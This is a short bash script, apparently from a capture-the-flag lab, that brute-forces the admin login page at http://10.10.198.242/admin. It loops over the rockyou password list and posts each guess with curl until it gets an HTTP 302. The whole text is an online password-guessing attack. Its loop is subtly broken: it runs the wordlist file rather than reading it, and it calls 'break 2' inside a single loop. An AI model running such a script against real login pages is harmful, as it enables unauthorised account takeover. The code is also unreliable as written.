url="http://10.10.198.242/admin"
user="admin"
  for pass in $(/home/godsyndrome/BruteIt/rockyou.txt); do
    http_code=$(curl -L --data-urlencode  username="$user" --data-urlencode password="$pass" "$url" -w '%{http_code}' -o /dev/null -s)
    if [[ $http_code -eq 302 ]]; then
      echo "Success: User: '$user' Pass: '$pass'"
      break 2
    fi
done
